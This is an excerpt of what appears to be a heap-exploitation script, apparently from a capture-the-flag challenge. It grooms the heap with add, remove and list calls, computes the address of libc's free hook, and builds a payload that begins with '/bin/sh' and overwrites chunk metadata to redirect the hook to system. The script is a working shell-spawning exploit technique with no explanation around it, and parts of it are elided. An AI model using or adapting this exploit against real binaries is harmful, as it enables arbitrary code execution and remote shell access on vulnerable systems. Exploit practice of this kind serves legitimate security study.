...
add(0x80,"a"*0x80) # index1
add(0x60,"a"*0x60) # index4
remove(1) 
remove(2) #index1
add(0x80,"\n") 
lst()
...
free_hook_offset = 0x00000000003c69a8
free_hook_addr = libc_base+free_hook_offset
system_addr = libc.symbols["system"]
payload = "/bin/sh\x00"+"a"*(0x200-0x8)+p64(0)+p64(0x20)+p64(0x200)+p64(free_hook_addr)
# payload = "a"*0x200
